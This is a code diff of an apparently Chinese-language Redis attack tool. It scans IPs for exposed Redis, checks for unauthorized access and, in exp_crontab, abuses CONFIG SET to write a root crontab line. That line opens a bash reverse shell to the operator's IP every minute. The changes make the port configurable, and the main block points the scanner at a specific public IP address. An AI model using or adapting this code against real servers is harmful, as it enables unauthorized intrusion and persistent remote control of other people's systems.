@@ -21,7 +21,7 @@ def start_scan():
     # 创建线程池（建议不超过50个线程）
     with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
         # 提交扫描任务到线程池
-        futures = [executor.submit(scan_port, ip) for ip in targets]
+        futures = [executor.submit(scan_port, ip, port=6379) for ip in targets]
 
         # 等待所有任务完成
         for future in concurrent.futures.as_completed(futures):
@@ -31,16 +31,17 @@ def start_scan():
                 print(f"\033[91m扫描异常: {str(e)}\033[0m")
 
 
-def scan_port(ip):
+def scan_port(ip, port=6379):
     """
     检查指定 IP 的 Redis 端口是否开放。
 
+    :param port: 设置默认端口
     :param ip: 需要扫描的 IP 地址
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(0.3)  # 设置超时时间
     try:
-        s.connect((ip, 6379))  # 尝试连接到 Redis 默认端口 6379
+        s.connect((ip, port))  # 尝试连接到 Redis 默认端口 6379
         print(f"\033[92m[+] {ip} 的 6379 端口上有 Redis 服务\033[0m")
         s.close()
         check_redis_connect(ip)
@@ -49,14 +50,15 @@ def scan_port(ip):
         return
 
 
-def check_redis_connect(ip):
+def check_redis_connect(ip, port=6379):
     """
     检查指定 IP 的 Redis 是否存在未授权访问问题。
 
+    :param port:
     :param ip: 需要检查的 IP 地址
     """
     try:
-        r = redis.StrictRedis(host=ip, port=47241, socket_timeout=3)
+        r = redis.StrictRedis(host=ip, port=port, socket_timeout=3)
         info = r.info()
 
         # 新增操作系统判断
@@ -111,7 +113,7 @@ def exp_crontab(redis_client):
     """
     Linux专用定时任务写入（Windows系统自动跳过）
     """
-
+    your_ip = ''
     # 尝试设置Redis配置以修改Linux定时任务
     try:
         # 设置Redis保存目录
@@ -119,7 +121,7 @@ def exp_crontab(redis_client):
         # 设置Redis数据库文件名
         redis_client.config_set('dbfilename', 'root')
         # 设置定时任务命令，每分钟执行一次
-        redis_client.set('x', '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/your_ip/8888 0>&1\n\n')
+        redis_client.set('x', '\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/' + your_ip + '/8888 0>&1\n\n')
         # 保存Redis配置
         redis_client.save()
         # 打印成功消息
@@ -131,4 +133,4 @@ def exp_crontab(redis_client):
 
 
 if __name__ == '__main__':
-    scan_port("123.58.224.8")
+    scan_port("123.58.224.8", 47241)
